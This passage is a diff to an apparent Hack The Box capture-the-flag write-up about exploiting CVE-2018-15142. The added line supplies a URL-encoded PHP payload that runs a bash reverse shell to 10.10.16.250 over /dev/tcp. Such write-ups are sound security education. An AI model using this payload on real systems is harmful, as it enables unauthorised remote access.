@@ -209,7 +209,7 @@ Using CVE-2018-15142, we realize that we can execute arbitary PHP code from the 
 
 ![POC for RCE](https://github.com/joelczk/writeups/blob/main/HTB/Images/cache/rce_poc.PNG)
 
-Now, what we have to do is to craft a single line url-encoded PHP payload that uploads a reverse shell to the vulnerable website. We will then trigger the payload by visiting ```/portal/exploit.php```
+Now, what we have to do is to craft a single line url-encoded PHP payload, ```%3C%3Fphp%0A%0Aexec(%22%2Fbin%2Fbash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.16.250%2F3001%200%3E%261%27%22)%3B``` that uploads a reverse shell to the vulnerable website. We will then trigger the payload by visiting ```/portal/exploit.php```
 
 ![RCE reverse shell](https://github.com/joelczk/writeups/blob/main/HTB/Images/cache/rce_reverse_shell.PNG)
 
